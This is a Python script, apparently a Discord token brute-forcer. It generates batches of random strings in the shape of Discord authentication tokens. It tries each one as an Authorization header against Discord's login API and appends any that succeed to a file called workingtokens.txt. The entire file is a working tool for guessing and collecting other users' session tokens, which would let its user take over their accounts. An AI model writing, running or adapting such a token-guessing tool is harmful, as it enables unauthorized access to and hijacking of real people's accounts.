import random
import string
import os
import requests
print("NOTE! 1 token loop = 5 Tokens of different types. ")
N = input("How many tokens loop?: ")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))
while(int(count)<int(N)):
    tokens = []
    firstGen = random.choice(string.ascii_letters).upper()+random.choice(string.ascii_letters).upper()+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+ random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    secondGen = "MT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    thirdGen = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    fourthGen = "MD"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    fifthGen = "MT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    print(firstGen)
    print(secondGen)
    print(thirdGen)
    print(fourthGen)
    print(fifthGen)
    count+=1
    tokens.append(firstGen)
    tokens.append(secondGen)
    tokens.append(thirdGen)
    tokens.append(fourthGen)
    tokens.append(fifthGen)
    for token in tokens:
        header = {
            "Authorization": token
        }
        src = requests.get('https://discordapp.com/api/v6/auth/login', headers=header)
        try:
            if src.status_code == 200:
                print('[+] Token Works!')
                f= open(current_path+"/"+"workingtokens.txt","a")
                f.write(token+"\n")
            else:
                print('[-] Invalid Token.')
        except Exception:
            print("[-] Can't connect to discordapp.com")
    tokens.remove(token)
    
